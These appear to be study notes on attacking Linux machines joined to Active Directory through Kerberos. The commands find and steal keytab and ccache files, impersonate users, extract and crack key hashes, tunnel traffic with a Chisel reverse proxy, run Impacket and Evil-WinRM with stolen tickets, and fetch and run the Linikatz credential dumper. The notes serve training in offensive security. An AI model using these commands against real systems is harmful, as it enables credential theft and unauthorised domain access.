- Although not common, Linux computers can connect to Active Directory to provide centralized Identity management and integrate with organization's system.
- A Linux computer connected to AD commonly uses Kerberos authentication.
- A Linux can be configured in various ways to store Kerberos tickets

## Kerberos on Linux:

- Both Windows and Linux uses the same process to request Ticket Granting Ticket(TGT) and Service Ticket(TGS).
- But Linux can store the ticket information may vary depending on the Linux Distribution and Implementation.
- In most Linux machine it stores Kerberos tickets as ==`ccache files`== in ==`/tmp`== directory.
- By default the location for storing Kerberos ticket is stored in the environment variable ==`KRB5CCNAME`==. 
- The ccahe files are protected by specific read/write permissions.
- Another use of Kerberos in Linux is with ==`keytab`== files. 
	- This is the file that contain pairs of Kerberos principals and encrypted keys.
	- This can be used to authenticate various remote system using Kerberos without entering a password.
	- This files commonly allow scripts to authenticate automatically using Kerberos without requiring a Human interaction or access to a password stored in a plain text file.
	- Any computer that has Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.

## Identifying Linux and Active Directory integration:

- If the Linux machine is domain-joined using ==`realm`==, a tool used to manage system enrollment(joining/leaving) in a domain and set which domain users or group are allowed to access the local system resources.
- `realm` can be used to check weather the machine is domain-joined or not.
- `Command`:
	- `realm list`

- #### PS - Check if Linux machine is domain-joined:
	
	- `ps -ef | grep -i "winbind\|sssd"`

## Finding Kerberos tickets in Linux:

- ### Finding KeyTab Files:
	
	- A straightforward approach is to use `find` to search for files whose name contains the word ==`keytab`==. 
	- Default extension for Kerberos ticket is ==`.keytab`==.
	- `Command`:
		- `find / -name *keytab* -ls 2>/dev/null`
	
	- Another way to find KeyTab files is in automated scripts configured using a ==`cronjob`== or any other Linux service.
	
	- ### Identifying KeyTab files in Cronjobs:
		
		- `Command`:
			- `crontab -l` 
			- kinit allows interaction with Kerberos and its function is to request the user's TGT and store this ticket in the cache(ccache file).
			- kinit import a keytab into the session and act as the user.

- ### Finding ccache files: 
	
	-  A credential cache or ccache file holds Kerberos credentials while  they remain valid and, generally, while the user's session lasts.
	- When user authenticates to the domain, a ccache file is created that stores the ticket information.
	- The path to this file is placed in the ==`KRB5CCNAME`== environment variable.
	- This variable is used by tools that support Kerberos authentication to find Kerberos data.
	
	- #### Reviewing environment variables for ccache files:
		
		- `Command`:
			- `env | grep -i krb5`
		- ccache files are located under `/tmp` directory
	
# Abusing KeyTab files:

-  KeyTab file have several uses.
	- Using `kinit` an attacker can impersonate a user. To use KeyTab file we need to know which user it was created for. 
	- ==`klist`== is another application used to interact with Kerberos on Linux. This application reads information from a KeyTab file
	- `Command`:
		
		- `ls -la /tmp`
		
		- ###### Listing KeyTab file information:
			 
			- `klist -k -t <file_path_if_found>`
		
		-  After getting the information the, the tool `kinit` can be used 
		
		- ###### Impersonating a user with a KeyTab:
			
			- `Command`:
				
				- `klist`
					- for current user
				- `kinit <user_domain_name> -k -t <kerberos_keytab_file>`
				- `klist`:
					- for the changed user.

- ## KeyTab Extract:
	
	- The second method is to abuse Kerberos on Linux is extracting the secrets from a keytab file.
	- The above process will allow a user to impersonate another user but in order to get access to the target machine a password is required.
	- The password can be obtained by cracking the hashes inside the ==`keyTab`== files using a tool  [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
		- This tool will extract the valuable information from 502-type .keytab file.
		- `Command`:
			
			- `python3 /opt/keytabextract.py <.keytab_file_location>`
			- After getting the hashes we can use other tool to extract the password like:
				- NTLM can be cracked by using the tool Hydra and John the Ripper
				- AES256 can be used to Forged the kerberos key by using Rubeus tool


# Abusing KeyTab ccache:

- To abuse a ccache file, all we need is read privilege on the file.
- This file located in `/tmp`
- `Command`:
	
	- ##### Privilege escalation to root:
		
		- `ssh <user_name>@domain_name@<target_address> -p <port>` 
	
	- `sudo su` command to change the user to root.
	
	- ##### Looking for ccache files:
		
		-  `ls -la /tmp`
		- This command will help to identify which ticket are present on the machine and to whom and their expiration time.
	
	- ##### Identifying group membership with the id command:
		
		- `id <user_name>`
		-  To use ccache file, we can copy the ccache file and assign the file path to the `KRB5CCNAME` variable.
	
	- ##### Importing the ccache file into the current session:
		
		-  `Command`:
			
			- `klist`
			- `cp </tmp/<ccahche_file>> .`
			- `export KRB5CCNAME=</root/<ccahche_file>>`
			-  consider the values "valid starting" and "expires." If the expiration date has passed, the ticket will not work. `ccache files` are temporary. They may change or expire if the user no longer uses them or during login and logout operations.
	
- ## Using Linux attack tools with Kerberos:
	
	-  Many Linux attack tools that interact with Windows AD support `Kerberos authentication`
	- There should be `KRB5CCNAME` environment variable set to the ccache file.
	- #### Tools:
		
		- Chisel 
		- Proxychain
		
	- Edit the file `/etc/hosts` to hardcore IP addresses of the domain and the target machine.
	
	- ### ProxyChain Configuration File:
		
		-  `cat /etc/proxychains.conf`
	
	- ### Download Chisel to the attack host:
		
		-  `wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz`
		- `gzip -d chisel_1.7.7_linux_amd64.gz`
		- `mv chisel_* chisel && chmod +x ./chisel`
		- `sudo ./chisel server --reverse`
	
	- ### Connect to the Target Machine:
		
		- `Use xfreerdp to connect to the targets Windows`
		
		- ###### On Target Machine:
			- `Cmd`: 
				- `c:\tools\chisel.exe client target:port R:socks`
				
				- Now we need to transfer target ccache file from attacker host and create the environment variable `KRB5CCNAME` with the value corresponding to the path of the ccahe file.
			
			- #### Setting the KRB5CCNAME environment variable:
				 
				- `export KRB5CCNAME = <krb5ccname_file_path>`
	
- ## Impacket:
	
	-  To use Kerberos ticket
	- Need to specify the ==`target machine name`==(not the Ip address) and use the option ==`-k`==.
	- Can also include ==`-no-pass`== to bypass the password.
	
	- ###### Using Impacket with proxychains and Kerberos authentication:
		
		- `proxychains impacket-wmiexec <target_system_name> -k`

- ## Evil-WinRM:
	
	-  To use evil-winrm with Kerberos, we need to install the Kerberos package used for network authentication
	- In some Linux like Debian-based it is called ==`krb5-user`==.
	- ### Installation:
		
		- `sudo apt-get install krb5-user -y`
		- we'll get a prompt for the Kerberos realm.
		- In case the package `krb5-user` is already installed, we need to change the configuration file `/etc/krb5.conf`
		
		- ### Kerberos configuration file for Domain:
			
			- `cat /etc/krb5.conf`
			- `default_realm = <Domain_name>`
			- ```
			  [realms] 
					<Domain_name>{
						 kdc = <target_system_name>.<domain_name>
					}
			  ```
		
		- ### Using Evil-WinRM with Kerberos:
			
			- `Command`:
				
				- `proxychains evil-winrm -i <target_name> -r <domain_name>`

- ## Miscellaneous:
	
	-  If want to use a `ccache` file in Windows or `kirbi file` in a Linux Machine.
	- Use ==`impacket-ticketConverter`== to convert them.
	- Specify the file we want to convert and the output filename.
	
	- ### Impacket Ticket Converter:
		 
		-  `impacket-ticketconverter <ticket_env> <file_name>`
		- We can do the reverse operation by first selecting a `.kirbi file`. Let's use the `.kirbi` file in Windows
	
	- ## Linikatz:
		
		- It is a tool created by Cisco's security team for exploiting credential on Linux Machine when there is an integration with AD{active directory}.
		- To take advantage of Linikatz we need to be root on the machine.
		- This tool will extract all the credentials, including Kerberos ticket, from different Kerberos implementation such as FreeIPA, SSSD, Samba, Vintella etc.
		-  it places them in a folder whose name starts with `linikatz.`
		-  Inside this folder, the credentials in the different available formats, including ccache and keytabs are present.
		- `Command`:
			
			-  `wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh`
			- `/opt/linikatz.sh`
